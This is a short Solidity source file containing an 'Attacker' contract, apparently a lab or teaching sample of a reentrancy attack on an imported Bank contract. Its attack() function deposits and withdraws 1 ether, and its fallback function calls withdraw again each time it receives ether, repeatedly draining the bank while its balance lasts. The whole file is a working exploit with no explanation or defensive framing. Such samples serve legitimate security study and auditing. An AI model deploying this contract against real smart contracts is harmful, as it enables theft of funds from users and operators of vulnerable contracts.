// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./Bank.sol";

contract Attacker {
    Bank bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
